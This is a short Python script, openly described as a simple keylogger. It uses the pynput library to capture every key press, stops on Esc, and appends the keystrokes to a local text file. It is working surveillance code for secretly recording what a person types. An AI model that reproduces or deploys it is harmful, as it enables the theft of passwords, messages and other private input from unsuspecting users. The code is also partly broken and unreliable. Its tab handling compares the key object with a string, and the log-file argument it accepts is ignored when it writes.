from pynput import keyboard
import argparse
import os

# Default Key_log.txt file path
DEFAULT_LOG_FILE = "Key_log.txt"

# Callbacks function to handle key press events
def on_press(key):
    
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif key == 'Key.tab':
        letter = "\t"
    elif letter == 'Key.backspace':
        letter = '[BACKSPACE]'
    elif letter == 'Key.esc':
        # Stop the Listener
        print("Keylogger stopped.")
        return False
    elif letter.startswith('Key.'):
        # Ignore other special keys
        return

    # To write the keystrokes in the Key_log.txt file
    with open("Key_log.txt", 'a') as f:
        f.write(letter)

# main
def main():
    parser = argparse.ArgumentParser(description="A simple keylogger")
    parser.add_argument('--Key_log', type=str, default=DEFAULT_LOG_FILE, help="The file to log keystrokes to")
    args = parser.parse_args()

    Key_log = args.Key_log

    # Ensure the Key_log.txt file exists
    if not os.path.exists(Key_log):
        print(f"Creating log file: {Key_log}")
        open(Key_log, 'w').close()

    print(f"Logging keystrokes to {Key_log}")

    # Setting the listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()